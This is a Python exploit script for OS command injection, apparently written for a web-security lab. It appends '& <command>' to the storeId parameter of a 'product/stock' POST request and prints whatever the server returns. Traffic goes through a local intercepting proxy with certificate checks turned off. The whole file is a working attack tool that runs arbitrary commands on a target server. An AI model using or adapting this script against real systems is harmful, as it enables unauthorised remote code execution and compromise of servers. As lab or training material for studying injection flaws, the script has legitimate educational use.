import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def run_command(url, command):
    path="product/stock"
    command_injection='1 & ' + command
    params={'productId':'1','storeId':command_injection}
    res = requests.post(url=url+path, data=params, proxies=proxies, verify=False)

    if (len(res.text)>3):
        print("(+) Output of command is:\n" + res.text)


def main():
    if len(sys.argv)!=3:
        print("[+] Usage: %s url command" %sys.argv[0])
        print("[+] Example: %s http://www.example.com/ whoami" %sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    command=sys.argv[2]
    print("Running command...")
    run_command(url,command)

if __name__ == "__main__":
    main()